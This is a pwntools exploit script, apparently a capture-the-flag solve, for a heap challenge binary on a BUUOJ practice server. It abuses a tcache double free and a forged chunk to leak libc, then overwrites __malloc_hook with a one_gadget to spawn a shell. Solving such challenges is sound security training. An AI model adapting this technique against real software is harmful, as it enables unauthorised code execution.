from pwn import *

# p = process('./final')
p = remote('node4.buuoj.cn', 26439)
elf = ELF('./final')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
# lib = ELF('../../pwn/libc/u16/libc-2.23-32.so')
# lib = ELF('/lib/i386-linux-gnu/libc.so.6')


def add(id_, size_, mess):
    p.recvuntil(b'choice >')
    p.sendline(b'1')
    p.recvuntil(b'input the index')
    p.sendline(id_)
    p.recvuntil(b'input the size')
    p.sendline(size_)
    p.recvuntil(b'now you can write something')
    p.send(mess)


def delete(id_):
    p.recvuntil(b'choice >')
    p.sendline(b'2')
    p.recvuntil(b'input the index')
    p.sendline(id_)


add(b'0', b'112', b'aaa')
p.recvuntil(b'0x')
heap_addr = int(p.recv(12), 16) - 0x10
print(hex(heap_addr))
add(b'1', b'16', b'bbb')
for i in range(2, 9):
    add(str(i), b'112', str(i))
add(b'9', b'32', b'aaa')
delete(b'9')
delete(b'9')
payload = p64(heap_addr)
add(b'10', b'32', payload)
add(b'11', b'32', payload)
payload = p64(0) + p64(0x421)
add(b'12', b'32', payload)
delete(b'0')
delete(b'1')
add(b'13', b'112', b'aaa')
add(b'14', b'16', b'aaa')
add(b'15', b'16', b'aaa')
p.recvuntil(b'0x')
main_area = int(p.recv(12), 16) - 88 - 0x8
print(hex(main_area))
base_addr = main_area - 0x10 - lib.symbols['__malloc_hook']
print(hex(base_addr))

delete(b'2')
delete(b'2')
payload = p64(main_area - 0x10)
add(b'16', b'112', payload)
add(b'17', b'112', payload)
one_gadget = 0x10a38c
payload = base_addr + one_gadget
add(b'18', b'112', p64(payload))
p.sendline(b'1')
p.sendline(b'19')
# add(b'19', b'16', b'aaa')
# gdb.attach(p)
p.interactive()
